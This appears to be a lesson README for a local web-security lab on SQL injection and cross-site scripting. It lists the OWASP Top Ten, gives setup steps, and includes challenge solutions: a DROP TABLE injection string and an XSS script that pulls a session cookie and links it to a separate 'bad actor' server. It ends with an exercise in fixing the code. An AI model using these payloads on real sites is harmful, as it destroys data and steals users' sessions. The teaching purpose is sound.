# Cross-site Scripting and SQL Injection

OWASP is one of those unofficial official organizations that holds a lot of sway in the security world.  They publish a few guides that tend to be seen as authoritative.  One of those guides is the annual [OWASP Top Ten](https://owasp.org/www-project-top-ten/).  

These are the most common and most serious security flaws and vulnerabilities on the web today.  Just for the sake of thoroughness--and because, just maybe, you are wary of clicking on just any old link you happen across--, here is OWASP's most recent top 10:

1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML External Entities
5. Broken Access Control
6. Security Misconfiguration
7. Cross-Site Scripting
8. Insecure Deserialization
9. Using Components with Known Vulnerabilities
10. Insufficient Logging and Monitoring

We're going to spend today worrying about SQL Injection and Cross-Site Scripting.

## SQL Injection
Always Sanitize Your Inputs.  We are already familiar with basic SQL commands, such as this fine query that returns everything in the "users" table:

```SQL
SELECT * FROM users;
```

Well, let's say you have a website where you sell Compact Discs on the Internet.  





## Challenges


### Setup
The challenges for today will require a little bit of setup.  

1. Clone this repo and cd into the base directory.
2. Create a virtual environment

```bash
python -m venv venv
```

3. Activate your virtual environment

```bash
source venv/bin/activate
```

4. Install the necessary Python module(s)

```bash
pip install -r requirements.txt
```

Run the bash script:
```bash
./start.sh
```
It will populate the database, and start the server.

Go to localhost:2222/ and see what you can do.

### SQL Injection Challenge: Little Bobby Tables
Some people just want to watch the world burn.  Today you'll get to sample that delicious nihilism as you (relatively) easily break things that other people spent so much more time making.  

Don't get me wrong, hackers aren't all bleakness and evil--they also love a good laugh.  In the dark corners of the internet, where everyone types with a hoodie on, there's a well-known internet comic.

[Here is one of his comics](https://xkcd.com/327/)

Unfortunately, I'm not sure I get the joke.  What could it mean?  

Note: Your database might become corrupted as you work through this challenge.  If so, simply start fresh by deleting users_posts.db, and running the start script.  When you do figure it out, you'll definitely have to re-create the database.

## Solution
In username:
```SQL
username'; DROP TABLE posts;
```


### Cross-Site Scripting Challenge: Claim Your Free Ipod!!!11
This one has some extra setup.  You'll be running an additional server on localhost:5000.  From the base directory, and in another terminal (split terminal):
1. npm install
2. node badActorServer.js

Now you have two whole servers running at the same time.

Savy internet users know to avoid Nigerian royals and herbal enhancements... But who can resist a brand new Ipod?  In a moment of weakness, you might even be tempted to click that flashing link and roll the dice.  Let's find out why you shouldn't do that.

This one is a little more complicated than the first.

Your goal is to get an unsuspecting FakeSociety user to click on a link.  You'll have to figure out some way to get that content into FakeSociety's server, onto their page, and make it tempting enough to click.  That link will direct the user to your nefarious server (badActorServer.js) and take along the user's bank account session cookie.  That cookie contains the user's bank account login information.  You should see the users bank account login information displayed to you on the page.  Then--and here's the irony--you're going to go out and buy your own Ipod!

## Solution
In username:
```html
    <script>let baseUrl = 'http://127.0.0.1:5000/'; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>

```


## The Ethical Hacker
After years of cybrcrime, you start having second thoughts about your place in the world.  Sure, you have lots of Ipods, and no school records, but in the end, aren't you really just a social parasite?  It's time to make amends.  Since you know how to break it, it shouldn't be that hard to fix it.  

Change the source code so that your old attacks don't work anymore.